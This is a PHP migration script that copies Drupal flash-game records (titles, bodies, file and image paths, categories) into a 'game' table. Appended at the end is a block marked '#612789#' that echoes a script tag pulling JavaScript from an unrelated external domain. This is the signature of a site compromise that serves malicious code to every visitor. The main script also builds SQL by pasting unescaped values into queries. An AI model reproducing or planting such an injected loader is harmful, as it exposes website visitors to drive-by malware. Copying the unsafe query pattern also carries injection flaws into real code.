<?php 
include 'inc/config.php';


$select = mysql_query("select n.nid,n.vid,n.title,n.body,f.fid,s.filename,s.filepath,t.tid,c.field_upload_image_fid,c.field_othersite_game_value from node_revisions n join flashnode f ON n.nid=f.nid JOIN files s ON s.fid=f.fid JOIN term_node t ON t.nid=n.nid JOIN content_type_flashnode c ON c.nid=n.nid");

while($fetch=mysql_fetch_array($select))
{
	
$title = $fetch['title'];
$body = $fetch['body'];
$filepath = $fetch['filepath'];
$filename = $fetch['filename'];
$catid = $fetch['tid'];
$field_upload_image_fid = $fetch['field_upload_image_fid'];
$other = $fetch['field_othersite_game_value'];
$img = mysql_query("select filename,filepath from files where fid='$field_upload_image_fid'");
$fetimg = mysql_fetch_array($img);
$img_file_name = $fetimg['filename'];
$img_file_path = $fetimg['filepath']; 

$insert = mysql_query("insert into game (cat_id,title,instructions,img_name,image_file,flash_name,flash_file,other_site) values('$catid','$title','$body','$img_file_name','$img_file_path','$filename','$filepath','$other')");
	
}


?>
<?php
#612789#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967033\"></script>";
echo $g;
}
#/612789#
?>